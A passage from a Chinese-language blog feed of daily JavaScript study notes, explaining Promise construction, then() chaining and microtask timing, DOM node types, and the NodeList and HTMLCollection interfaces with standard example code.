<h4 id="3-3Promise-构造函数"><a href="#3-3Promise-构造函数" class="headerlink" title="3.3Promise 构造函数"></a>3.3Promise 构造函数</h4><p>JavaScript 提供原生的<code>Promise</code>构造函数，用来生成 Promise 实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="comment">/* 异步操作成功 */</span>)&#123;</span><br><span class="line">    resolve(value);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">/* 异步操作失败 */</span></span><br><span class="line">    reject(<span class="keyword">new</span> <span class="built_in">Error</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Promise</code>构造函数接受一个函数作为参数，该函数的两个参数分别是<code>resolve</code>和<code>reject</code>。它们是两个函数，由 JavaScript 引擎提供，不用自己实现。</p>
<p><code>resolve</code>函数的作用是，将<code>Promise</code>实例的状态从“未完成”变为“成功”（即从<code>pending</code>变为<code>fulfilled</code>），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去。<code>reject</code>函数的作用是，将<code>Promise</code>实例的状态从“未完成”变为“失败”（即从<code>pending</code>变为<code>rejected</code>），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">timeout</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(resolve, ms, <span class="string">&#x27;done&#x27;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">timeout(<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>timeout(100)</code>返回一个 Promise 实例。100毫秒以后，该实例的状态会变为<code>fulfilled</code>。</p>
<h4 id="3-4-Promise-prototype-then"><a href="#3-4-Promise-prototype-then" class="headerlink" title="3.4 Promise.prototype.then()"></a>3.4 Promise.prototype.then()</h4><p>Promise 实例的<code>then</code>方法，用来添加回调函数。</p>
<p><code>then</code>方法可以接受两个回调函数，第一个是异步操作成功时（变为<code>fulfilled</code>状态）的回调函数，第二个是异步操作失败（变为<code>rejected</code>）时的回调函数（该参数可以省略）。一旦状态改变，就调用相应的回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  resolve(<span class="string">&#x27;成功&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">p1.then(<span class="built_in">console</span>.log, <span class="built_in">console</span>.error);</span><br><span class="line"><span class="comment">// &quot;成功&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;失败&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line">p2.then(<span class="built_in">console</span>.log, <span class="built_in">console</span>.error);</span><br><span class="line"><span class="comment">// Error: 失败</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>p1</code>和<code>p2</code>都是Promise 实例，它们的<code>then</code>方法绑定两个回调函数：成功时的回调函数<code>console.log</code>，失败时的回调函数<code>console.error</code>（可以省略）。<code>p1</code>的状态变为成功，<code>p2</code>的状态变为失败，对应的回调函数会收到异步操作传回的值，然后在控制台输出。</p>
<p><code>then</code>方法可以链式使用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">p1</span><br><span class="line">  .then(step1)</span><br><span class="line">  .then(step2)</span><br><span class="line">  .then(step3)</span><br><span class="line">  .then(</span><br><span class="line">    <span class="built_in">console</span>.log,</span><br><span class="line">    <span class="built_in">console</span>.error</span><br><span class="line">  );</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>p1</code>后面有四个<code>then</code>，意味依次有四个回调函数。只要前一步的状态变为<code>fulfilled</code>，就会依次执行紧跟在后面的回调函数。</p>
<p>最后一个<code>then</code>方法，回调函数是<code>console.log</code>和<code>console.error</code>，用法上有一点重要的区别。<code>console.log</code>只显示<code>step3</code>的返回值，而<code>console.error</code>可以显示<code>p1</code>、<code>step1</code>、<code>step2</code>、<code>step3</code>之中任意一个发生的错误。举例来说，如果<code>step1</code>的状态变为<code>rejected</code>，那么<code>step2</code>和<code>step3</code>都不会执行了（因为它们是<code>resolved</code>的回调函数）。Promise 开始寻找，接下来第一个为<code>rejected</code>的回调函数，在上面代码中是<code>console.error</code>。这就是说，Promise 对象的报错具有传递性。</p>
<h4 id="3-5-then-用法辨析"><a href="#3-5-then-用法辨析" class="headerlink" title="3.5 then() 用法辨析"></a>3.5 then() 用法辨析</h4><p>Promise 的用法，简单说就是一句话：使用<code>then</code>方法添加回调函数。但是，不同的写法有一些细微的差别，请看下面四种写法，它们的差别在哪里？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line">f1().then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> f2();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line">f1().then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  f2();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法三</span></span><br><span class="line">f1().then(f2());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法四</span></span><br><span class="line">f1().then(f2);</span><br></pre></td></tr></table></figure>
<p>为了便于讲解，下面这四种写法都再用<code>then</code>方法接一个回调函数<code>f3</code>。写法一的<code>f3</code>回调函数的参数，是<code>f2</code>函数的运行结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">f1().then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> f2();</span><br><span class="line">&#125;).then(f3);</span><br></pre></td></tr></table></figure>
<p>写法二的<code>f3</code>回调函数的参数是<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">f1().then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  f2();</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;).then(f3);</span><br></pre></td></tr></table></figure>
<p>写法三的<code>f3</code>回调函数的参数，是<code>f2</code>函数返回的函数的运行结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">f1().then(f2())</span><br><span class="line">  .then(f3);</span><br></pre></td></tr></table></figure>
<p>写法四与写法一只有一个差别，那就是<code>f2</code>会接收到<code>f1()</code>返回的结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">f1().then(f2)</span><br><span class="line">  .then(f3);</span><br></pre></td></tr></table></figure>

<h4 id="3-6-实例：图片加载"><a href="#3-6-实例：图片加载" class="headerlink" title="3.6 实例：图片加载"></a>3.6 实例：图片加载</h4><p>下面是使用 Promise 完成图片的加载。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> preloadImage = <span class="function"><span class="keyword">function</span> (<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> image = <span class="keyword">new</span> Image();</span><br><span class="line">    image.onload  = resolve;</span><br><span class="line">    image.onerror = reject;</span><br><span class="line">    image.src = path;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>image</code>是一个图片对象的实例。它有两个事件监听属性，<code>onload</code>属性在图片加载成功后调用，<code>onerror</code>属性在加载失败调用。</p>
<p>上面的<code>preloadImage()</code>函数用法如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">preloadImage(<span class="string">&#x27;https://example.com/my.jpg&#x27;</span>)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123; <span class="built_in">document</span>.body.append(e.target) &#125;)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">&#x27;加载成功&#x27;</span>) &#125;)</span><br></pre></td></tr></table></figure>
<p>上面代码中，图片加载成功以后，<code>onload</code>属性会返回一个事件对象，因此第一个<code>then()</code>方法的回调函数，会接收到这个事件对象。该对象的<code>target</code>属性就是图片加载后生成的 DOM 节点。</p>
<h4 id="3-7-小结"><a href="#3-7-小结" class="headerlink" title="3.7 小结"></a>3.7 小结</h4><p>Promise 的优点在于，让回调函数变成了规范的链式写法，程序流程可以看得很清楚。它有一整套接口，可以实现许多强大的功能，比如同时执行多个异步操作，等到它们的状态都改变以后，再执行一个回调函数；再比如，为多个回调函数中抛出的错误，统一指定处理方法等等。</p>
<p>而且，Promise 还有一个传统写法没有的好处：它的状态一旦改变，无论何时查询，都能得到这个状态。这意味着，无论何时为 Promise 实例添加回调函数，该函数都能正确执行。所以，你不用担心是否错过了某个事件或信号。如果是传统写法，通过监听事件来执行回调函数，一旦错过了事件，再添加回调函数是不会执行的。</p>
<p>Promise 的缺点是，编写的难度比传统写法高，而且阅读代码也不是一眼可以看懂。你只会看到一堆<code>then</code>，必须自己在<code>then</code>的回调函数里面理清逻辑。</p>
<h4 id="3-8-微任务"><a href="#3-8-微任务" class="headerlink" title="3.8 微任务"></a>3.8 微任务</h4><p>Promise 的回调函数属于异步任务，会在同步任务之后执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  resolve(<span class="number">1</span>);</span><br><span class="line">&#125;).then(<span class="built_in">console</span>.log);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码会先输出<code>2</code>，再输出1。因为<code>console.log(2)</code>是同步任务，而<code>then</code>的回调函数属于异步任务，一定晚于同步任务执行。</p>
<p>但是，Promise 的回调函数不是正常的异步任务，而是微任务（microtask）。它们的区别在于，正常任务追加到下一轮事件循环，微任务追加到本轮事件循环。这意味着，微任务的执行时间一定早于正常任务。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  resolve(<span class="number">2</span>);</span><br><span class="line">&#125;).then(<span class="built_in">console</span>.log);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码的输出结果是<code>321</code>。这说明<code>then</code>的回调函数的执行时间，早于<code>setTimeout(fn, 0)</code>。因为<code>then</code>是本轮事件循环执行，<code>setTimeout(fn, 0)</code>在下一轮事件循环开始时执行。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS异步操作-Promise对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0034</title>
    <url>/2021/05/22/%E6%89%93%E5%8D%A10034/</url>
    <content><![CDATA[<p><font color=#ae6642>无情最是台城柳，依旧烟笼十里堤。</font></p>
<h2 id="JS-DOM"><a href="#JS-DOM" class="headerlink" title="JS DOM"></a>JS DOM</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h3><h4 id="1-1-DOM"><a href="#1-1-DOM" class="headerlink" title="1.1 DOM"></a>1.1 DOM</h4><p>DOM 是 JavaScript 操作网页的接口，全称为“文档对象模型”（Document Object Model）。它的作用是将网页转为一个 JavaScript 对象，从而可以用脚本进行各种操作（比如增删内容）。</p>
<p>浏览器会根据 DOM 模型，将结构化文档（比如 HTML 和 XML）解析成一系列的节点，再由这些节点组成一个树状结构（DOM Tree）。所有的节点和最终的树状结构，都有规范的对外接口。</p>
<p>DOM 只是一个接口规范，可以用各种语言实现。所以严格地说，DOM 不是 JavaScript 语法的一部分，但是 DOM 操作是 JavaScript 最常见的任务，离开了 DOM，JavaScript 就无法控制网页。另一方面，JavaScript 也是最常用于 DOM 操作的语言。后面介绍的就是 JavaScript 对 DOM 标准的实现和用法。</p>
<h4 id="1-2节点"><a href="#1-2节点" class="headerlink" title="1.2节点"></a>1.2节点</h4><p>DOM 的最小组成单位叫做节点（node）。文档的树形结构（DOM 树），就是由各种不同类型的节点组成。每个节点可以看作是文档树的一片叶子。</p>
<p>节点的类型有七种。</p>
<ul>
<li><code>Document</code>：整个文档树的顶层节点</li>
<li><code>DocumentType</code>：<code>doctype</code>标签（比如<code>&lt;!DOCTYPE html&gt;</code>）</li>
<li><code>Element</code>：网页的各种HTML标签（比如<code>&lt;body&gt;</code>、<code>&lt;a&gt;</code>等）</li>
<li><code>Attr</code>：网页元素的属性（比如<code>class=&quot;right&quot;</code>）</li>
<li><code>Text</code>：标签之间或标签包含的文本</li>
<li><code>Comment</code>：注释</li>
<li><code>DocumentFragment</code>：文档的片段<span id="more"></span>
浏览器提供一个原生的节点对象<code>Node</code>，上面这七种节点都继承了<code>Node</code>，因此具有一些共同的属性和方法。</li>
</ul>
<h4 id="1-3-节点树"><a href="#1-3-节点树" class="headerlink" title="1.3 节点树"></a>1.3 节点树</h4><p>一个文档的所有节点，按照所在的层级，可以抽象成一种树状结构。这种树状结构就是 DOM 树。它有一个顶层节点，下一层都是顶层节点的子节点，然后子节点又有自己的子节点，就这样层层衍生出一个金字塔结构，又像一棵树。</p>
<p>浏览器原生提供<code>document</code>节点，代表整个文档。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span></span><br><span class="line"><span class="comment">// 整个文档树</span></span><br></pre></td></tr></table></figure>
<p>文档的第一层有两个节点，第一个是文档类型节点（<code>&lt;!doctype html&gt;</code>），第二个是 HTML 网页的顶层容器标签<code>&lt;html&gt;</code>。后者构成了树结构的根节点（root node），其他 HTML 标签节点都是它的下级节点。</p>
<p>除了根节点，其他节点都有三种层级关系。</p>
<ul>
<li>父节点关系（parentNode）：直接的那个上级节点</li>
<li>子节点关系（childNodes）：直接的下级节点</li>
<li>同级节点关系（sibling）：拥有同一个父节点的节点</li>
</ul>
<p>DOM 提供操作接口，用来获取这三种关系的节点。比如，子节点接口包括<code>firstChild</code>（第一个子节点）和<code>lastChild</code>（最后一个子节点）等属性，同级节点接口包括<code>nextSibling</code>（紧邻在后的那个同级节点）和<code>previousSibling</code>（紧邻在前的那个同级节点）属性。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS DOM-概述</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0036</title>
    <url>/2021/05/23/%E6%89%93%E5%8D%A10036/</url>
    <content><![CDATA[<p><font color=gray>老骥伏枥，志在千里。</font></p>
<h2 id="JS-DOM"><a href="#JS-DOM" class="headerlink" title="JS DOM"></a>JS DOM</h2><h3 id="3-NodeList-接口，HTMLCollection-接口"><a href="#3-NodeList-接口，HTMLCollection-接口" class="headerlink" title="3. NodeList 接口，HTMLCollection 接口"></a>3. NodeList 接口，HTMLCollection 接口</h3><p>节点都是单个对象，有时需要一种数据结构，能够容纳多个节点。DOM 提供两种节点集合，用于容纳多个节点：<code>NodeList</code>和<code>HTMLCollection</code>。</p>
<p>这两种集合都属于接口规范。许多 DOM 属性和方法，返回的结果是<code>NodeList</code>实例或<code>HTMLCollection</code>实例。主要区别是，<code>NodeList</code>可以包含各种类型的节点，<code>HTMLCollection</code>只能包含 HTML 元素节点。</p>
<h4 id="3-1-NodeList-接口"><a href="#3-1-NodeList-接口" class="headerlink" title="3.1 NodeList 接口"></a>3.1 NodeList 接口</h4><h5 id="3-1-1-概述"><a href="#3-1-1-概述" class="headerlink" title="3.1.1 概述"></a>3.1.1 概述</h5><p><code>NodeList</code>实例是一个类似数组的对象，它的成员是节点对象。通过以下方法可以得到<code>NodeList</code>实例。</p>
<ul>
<li><code>Node.childNodes</code></li>
<li><code>document.querySelectorAll()</code>等节点搜索方法</li>
</ul>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.childNodes <span class="keyword">instanceof</span> NodeList <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><code>NodeList</code>实例很像数组，可以使用<code>length</code>属性和<code>forEach</code>方法。但是，它不是数组，不能使用<code>pop</code>或<code>push</code>之类数组特有的方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="built_in">document</span>.body.childNodes;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.isArray(children) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">children.length <span class="comment">// 34</span></span><br><span class="line">children.forEach(<span class="built_in">console</span>.log)</span><br></pre></td></tr></table></figure>
<p>上面代码中，NodeList 实例<code>children</code>不是数组，但是具有<code>length</code>属性和<code>forEach</code>方法。</p>
<p>如果<code>NodeList</code>实例要使用数组方法，可以将其转为真正的数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="built_in">document</span>.body.childNodes;</span><br><span class="line"><span class="keyword">var</span> nodeArr = <span class="built_in">Array</span>.prototype.slice.call(children);</span><br></pre></td></tr></table></figure>
<p>除了使用<code>forEach</code>方法遍历 NodeList 实例，还可以使用<code>for</code>循环。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="built_in">document</span>.body.childNodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; children.length; i++) &#123;</span><br><span class="line">  <span class="keyword">var</span> item = children[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意，NodeList 实例可能是动态集合，也可能是静态集合。所谓动态集合就是一个活的集合，DOM 删除或新增一个相关节点，都会立刻反映在 NodeList 实例。目前，只有<code>Node.childNodes</code>返回的是一个动态集合，其他的 NodeList 都是静态集合。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="built_in">document</span>.body.childNodes;</span><br><span class="line">children.length <span class="comment">// 18</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(<span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>));</span><br><span class="line">children.length <span class="comment">// 19</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，文档增加一个子节点，NodeList 实例<code>children</code>的<code>length</code>属性就增加了1。</p>
<h5 id="3-1-2-NodeList-prototype-length"><a href="#3-1-2-NodeList-prototype-length" class="headerlink" title="3.1.2 NodeList.prototype.length"></a>3.1.2 NodeList.prototype.length</h5><p><code>length</code>属性返回 NodeList 实例包含的节点数量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;xxx&#x27;</span>).length</span><br><span class="line"><span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>document.querySelectorAll</code>返回一个 NodeList 集合。对于那些不存在的 HTML 标签，<code>length</code>属性返回<code>0</code>。</p>
<h5 id="3-1-3-NodeList-prototype-forEach"><a href="#3-1-3-NodeList-prototype-forEach" class="headerlink" title="3.1.3 NodeList.prototype.forEach()"></a>3.1.3 NodeList.prototype.forEach()</h5><p><code>forEach</code>方法用于遍历 NodeList 的所有成员。它接受一个回调函数作为参数，每一轮遍历就执行一次这个回调函数，用法与数组实例的<code>forEach</code>方法完全一致。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="built_in">document</span>.body.childNodes;</span><br><span class="line">children.forEach(<span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">item, i, list</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;, <span class="built_in">this</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，回调函数<code>f</code>的三个参数依次是当前成员、位置和当前 NodeList 实例。<code>forEach</code>方法的第二个参数，用于绑定回调函数内部的<code>this</code>，该参数可省略。</p>
<h5 id="3-1-4-NodeList-prototype-item"><a href="#3-1-4-NodeList-prototype-item" class="headerlink" title="3.1.4 NodeList.prototype.item()"></a>3.1.4 NodeList.prototype.item()</h5><p><code>item</code>方法接受一个整数值作为参数，表示成员的位置，返回该位置上的成员。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.childNodes.item(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>item(0)</code>返回第一个成员。</p>
<p>如果参数值大于实际长度，或者索引不合法（比如负数），<code>item</code>方法返回<code>null</code>。如果省略参数，<code>item</code>方法会报错。</p>
<p>所有类似数组的对象，都可以使用方括号运算符取出成员。一般情况下，都是使用方括号运算符，而不使用<code>item</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.childNodes[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<h5 id="3-1-5-NodeList-prototype-keys-，NodeList-prototype-values-，NodeList-prototype-entries"><a href="#3-1-5-NodeList-prototype-keys-，NodeList-prototype-values-，NodeList-prototype-entries" class="headerlink" title="3.1.5 NodeList.prototype.keys()，NodeList.prototype.values()，NodeList.prototype.entries()"></a>3.1.5 NodeList.prototype.keys()，NodeList.prototype.values()，NodeList.prototype.entries()</h5><p>这三个方法都返回一个 ES6 的遍历器对象，可以通过<code>for...of</code>循环遍历获取每一个成员的信息。区别在于，<code>keys()</code>返回键名的遍历器，<code>values()</code>返回键值的遍历器，<code>entries()</code>返回的遍历器同时包含键名和键值的信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> children = <span class="built_in">document</span>.body.childNodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">of</span> children.keys()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> value <span class="keyword">of</span> children.values()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// #text</span></span><br><span class="line"><span class="comment">// &lt;script&gt;</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> entry <span class="keyword">of</span> children.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(entry);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Array [ 0, #text ]</span></span><br><span class="line"><span class="comment">// Array [ 1, &lt;script&gt; ]</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-HTMLCollection-接口"><a href="#3-2-HTMLCollection-接口" class="headerlink" title="3.2 HTMLCollection 接口"></a>3.2 HTMLCollection 接口</h4><h5 id="3-2-1-概述"><a href="#3-2-1-概述" class="headerlink" title="3.2.1 概述"></a>3.2.1 概述</h5><p><code>HTMLCollection</code>是一个节点对象的集合，只能包含元素节点（element），不能包含其他类型的节点。它的返回值是一个类似数组的对象，但是与<code>NodeList</code>接口不同，<code>HTMLCollection</code>没有<code>forEach</code>方法，只能使用<code>for</code>循环遍历。</p>
<p>返回<code>HTMLCollection</code>实例的，主要是一些<code>Document</code>对象的集合属性，比如<code>document.links</code>、<code>document.forms</code>、<code>document.images</code>等。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.links <span class="keyword">instanceof</span> HTMLCollection <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p><code>HTMLCollection</code>实例都是动态集合，节点的变化会实时反映在集合中。</p>
<p>如果元素节点有<code>id</code>或<code>name</code>属性，那么<code>HTMLCollection</code>实例上面，可以使用<code>id</code>属性或<code>name</code>属性引用该节点元素。如果没有对应的节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;img id=&quot;pic&quot; src=&quot;http://example.com/foo.jpg&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pic = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;pic&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.images.pic === pic <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>document.images</code>是一个<code>HTMLCollection</code>实例，可以通过<code>&lt;img&gt;</code>元素的<code>id</code>属性值，从<code>HTMLCollection</code>实例上取到这个元素。</p>
<h5 id="2-2-2-HTMLCollection-prototype-length"><a href="#2-2-2-HTMLCollection-prototype-length" class="headerlink" title="2.2.2 HTMLCollection.prototype.length"></a>2.2.2 HTMLCollection.prototype.length</h5><p><code>length</code>属性返回<code>HTMLCollection</code>实例包含的成员数量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.links.length <span class="comment">// 18</span></span><br></pre></td></tr></table></figure>

<h5 id="2-2-3-HTMLCollection-prototype-item"><a href="#2-2-3-HTMLCollection-prototype-item" class="headerlink" title="2.2.3 HTMLCollection.prototype.item()"></a>2.2.3 HTMLCollection.prototype.item()</h5><p><code>item</code>方法接受一个整数值作为参数，表示成员的位置，返回该位置上的成员。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> c = <span class="built_in">document</span>.images;</span><br><span class="line"><span class="keyword">var</span> img0 = c.item(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>item(0)</code>表示返回0号位置的成员。由于方括号运算符也具有同样作用，而且使用更方便，所以一般情况下，总是使用方括号运算符。</p>
<p>如果参数值超出成员数量或者不合法（比如小于0），那么<code>item</code>方法返回<code>null</code>。</p>
<h5 id="2-2-4-HTMLCollection-prototype-namedItem"><a href="#2-2-4-HTMLCollection-prototype-namedItem" class="headerlink" title="2.2.4 HTMLCollection.prototype.namedItem()"></a>2.2.4 HTMLCollection.prototype.namedItem()</h5><p><code>namedItem</code>方法的参数是一个字符串，表示<code>id</code>属性或<code>name</code>属性的值，返回对应的元素节点。如果没有对应的节点，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;img id=&quot;pic&quot; src=&quot;http://example.com/foo.jpg&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pic = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;pic&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.images.namedItem(<span class="string">&#x27;pic&#x27;</span>) === pic <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS DOM-NodeList 接口，HTMLCollection 接口</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0037</title>
    <url>/2021/05/23/%E6%89%93%E5%8D%A10037/</url>
    <content><![CDATA[<p><font color=gray>他进入了一个梦乡，那里的稻穗比高粱还高，穗粒比花生还大。风轻轻吹过，他就坐在稻穗下乘凉。</font></p>
<h2 id="JS-DOM"><a href="#JS-DOM" class="headerlink" title="JS DOM"></a>JS DOM</h2><h3 id="4-ParentNode-接口，ChildNode-接口"><a href="#4-ParentNode-接口，ChildNode-接口" class="headerlink" title="4. ParentNode 接口，ChildNode 接口"></a>4. ParentNode 接口，ChildNode 接口</h3><p>节点对象除了继承 Node 接口以外，还拥有其他接口。<code>ParentNode</code>接口表示当前节点是一个父节点，提供一些处理子节点的方法。<code>ChildNode</code>接口表示当前节点是一个子节点，提供一些相关方法。</p>
